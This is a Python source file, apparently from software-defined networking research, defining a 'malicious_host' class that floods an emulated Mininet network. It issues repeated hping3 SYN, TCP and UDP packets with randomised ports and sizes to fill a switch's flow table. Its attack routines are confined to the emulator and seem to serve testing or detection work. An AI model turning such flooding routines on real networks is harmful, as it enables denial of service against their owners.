from mininet.net import Mininet
from time import sleep
import time
from datetime import datetime
from random import randrange, choice, random, randint, uniform


def ip_generator(number_of_hosts=2):

    ip = ".".join(["10","0","0",str(randrange(2, number_of_hosts))])
    return ip

def port_generator():
    return randrange(1024, 65535)

class malicious_host():
  def __init__(self,name, net, idle_timeout) -> None:
    self.net = net
    self.name = name
    self.idle_timeout = idle_timeout
    self.attacks = []
    
  # This attack is to send a lot of flow entries to the switch in different ports with same IP
  # different dest_port 60
  def attack_controller_port(self, attack_interval, attack_number ,number_of_hosts, step=10):
    
    count = 0
    idle_timeout = 10
    victim_ip = ip_generator(number_of_hosts)
    while( count<attack_number):
      for i in range(step):
        choose_port = randint(1,2)
        attack = ''
        if choose_port==1 :  
          attack_port = randint(10000, 15000)
          attack = f'hping3 -c 1 -S -d {randint(100,400)} -p {attack_port} -s 10001 {victim_ip} &'    
        if choose_port == 2 :
          attack_port = randint(10000, 15000)
          attack = f'hping3 -c 1 -d {randint(100,400)} -S -p 10001 -s {attack_port} {victim_ip} &'   
        self.attacks.append(attack)
      for j in self.attacks: # store them to send them again (to live in flow_table)
        self.net.cmd(j)
      count = len(self.attacks)
      sleep(attack_interval)

  def attack_controller_ip(self, attack_interval, attack_number, number_of_hosts=2, step=10):
    #h1 hping3 -c 10 -S -p 9000 -a 192.168.1.100 10.0.0.2 can be used for IP attack
    victim_ip = ip_generator(number_of_hosts) 
    count = 0
    while( count<attack_number):
      sleep(attack_interval)
      for i in range(step):
        attack_port = randint(10000, 15000)
        attack = f'hping3 -S -d {randint(100,400)} -s {attack_port} -p 5002 -c 1 {victim_ip} &'
        self.attacks.append(attack)
      for j in self.attacks:
        self.net.cmd(j)
        sleep(0.1)
      count = len(self.attacks)
      
  def attack_protocol_change(self,attack_interval, attack_number, number_of_hosts=2, step=10):
    available_protocol = [ '--tcp', '--udp']
    count = 0
    for i in range(0,10):
      victim_ip = ip_generator(number_of_hosts)

      sleep(attack_interval)

      for j in range(step):
       
        if(len(self.attacks) <= attack_number):
          attack_port = randint(10000, 15000)
          rand_protocol = choice(available_protocol)
          attack = ''
          if rand_protocol == '--icmp':
            icmp_type = randint(0,30)
            icmp_code = randint(0,15)
            attack = f'hping3   -d {randint(100,200)} -p {rand_protocol} --icmptype {icmp_type} --icmpcode {icmp_code}  -c 1 {victim_ip}'
          elif rand_protocol == '--tcp':
            attack = f'hping3 -S -d {randint(100,200)}  -s  {attack_port} -p 80 -c 1 {victim_ip} &'
          else:
            attack = f'hping3  {rand_protocol} -d {randint(100,400)} --baseport {attack_port}  --destport 80 -c 1 {victim_ip} &'
          self.attacks.append(attack)
      for j in self.attacks:
        self.net.cmd(j)
        
        sleep(0.1)
      count = len(self.attacks)
      
  
